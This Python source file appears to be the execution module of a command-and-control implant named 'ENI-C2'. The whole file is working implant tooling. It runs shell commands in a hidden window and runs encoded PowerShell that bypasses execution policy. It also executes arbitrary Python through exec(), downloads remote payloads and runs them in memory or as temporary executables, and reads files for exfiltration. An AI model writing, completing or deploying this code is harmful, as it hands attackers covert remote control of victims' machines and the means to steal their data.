"""
ENI-C2 Execution Module
In-memory command execution with output capture.
"""

import os
import sys
import subprocess
import base64
import tempfile
from typing import Tuple, Optional


class Executor:
    """Handle command execution with OPSEC considerations."""
    
    @staticmethod
    def shell(command: str, timeout: int = 30) -> Tuple[int, str, str]:
        """Execute shell command and capture output."""
        try:
            proc = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
            )
            stdout, stderr = proc.communicate(timeout=timeout)
            return (
                proc.returncode,
                stdout.decode(errors="replace"),
                stderr.decode(errors="replace")
            )
        except subprocess.TimeoutExpired:
            proc.kill()
            return (-1, "", "Command timed out")
        except Exception as e:
            return (-1, "", str(e))
    
    @staticmethod
    def powershell(script: str, timeout: int = 60) -> Tuple[int, str, str]:
        """Execute PowerShell script in-memory."""
        # Bypass execution policy, no profile, hidden window
        cmd = (
            'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc '
            + base64.b64encode(script.encode("utf-16le")).decode()
        )
        return Executor.shell(cmd, timeout)
    
    @staticmethod
    def python_exec(code: str) -> Tuple[int, str, str]:
        """Execute Python code in current process."""
        import io
        from contextlib import redirect_stdout, redirect_stderr
        
        stdout_buf = io.StringIO()
        stderr_buf = io.StringIO()
        
        try:
            with redirect_stdout(stdout_buf), redirect_stderr(stderr_buf):
                exec(code, {"__builtins__": __builtins__})
            return (0, stdout_buf.getvalue(), stderr_buf.getvalue())
        except Exception as e:
            return (1, stdout_buf.getvalue(), f"{stderr_buf.getvalue()}\n{e}")
    
    @staticmethod
    def download_and_exec(url: str, method: str = "shell") -> Tuple[int, str, str]:
        """Download payload and execute in memory."""
        import requests
        
        try:
            resp = requests.get(url, timeout=15)
            resp.raise_for_status()
            payload = resp.content
        except Exception as e:
            return (-1, "", f"Download failed: {e}")
        
        if method == "powershell":
            return Executor.powershell(payload.decode(errors="replace"))
        elif method == "python":
            return Executor.python_exec(payload.decode(errors="replace"))
        else:
            # Write to temp, execute, delete
            try:
                with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as f:
                    f.write(payload)
                    f.flush()
                    result = Executor.shell(f.name)
                    os.unlink(f.name)
                    return result
            except Exception as e:
                return (-1, "", f"Exec failed: {e}")
    
    @staticmethod
    def upload_file(filepath: str) -> Optional[bytes]:
        """Read file for exfiltration."""
        try:
            with open(filepath, "rb") as f:
                return f.read()
        except Exception:
            return None
    
    @staticmethod
    def write_file(filepath: str, data: bytes) -> bool:
        """Write downloaded file to disk."""
        try:
            os.makedirs(os.path.dirname(filepath), exist_ok=True)
            with open(filepath, "wb") as f:
                f.write(data)
            return True
        except Exception:
            return False